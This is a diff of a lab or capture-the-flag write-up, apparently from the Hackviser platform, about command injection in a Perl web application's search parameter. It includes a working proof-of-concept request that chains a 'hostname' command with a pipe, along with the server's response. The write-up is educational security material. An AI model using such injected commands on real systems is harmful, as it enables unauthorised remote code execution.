@@ -7,14 +7,19 @@ Exploit a command injection vulnerability in a Perl-based web application to exe
 ## 🔍 Vulnerability Analysis
 
 - **Type:** Command Injection
+
 - **Endpoint:** Search functionality
+
 - **Parameter:** `search`
+
 - **Detection:** User input passed directly to Perl's `system()` function without sanitization
+
 - **Impact:** Remote code execution with web server privileges
 
 ## 💥 Exploitation
 
 ```http
+
 GET /search?search=canon-eos-rebel-t7 | hostname HTTP/1.1
 Host: living-ink.apac01.hackviser.space
 Result: Pipe character (|) allowed command chaining, executing hostname command and returning: brilliance
@@ -40,4 +45,5 @@ Privilege Analysis: Assessing execution context and potential impact
 ## Notes
 
 Conducted in a controlled environment for educational purposes.
+
 ```
